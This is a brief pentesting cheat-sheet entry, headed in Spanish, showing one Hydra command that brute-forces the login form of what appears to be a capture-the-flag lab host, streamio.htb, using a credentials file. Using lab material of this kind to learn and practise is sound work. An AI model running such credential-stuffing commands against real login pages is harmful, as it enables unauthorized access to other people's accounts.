# BruteForce

## Uso de Hydra

```null
hydra -C credentials.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

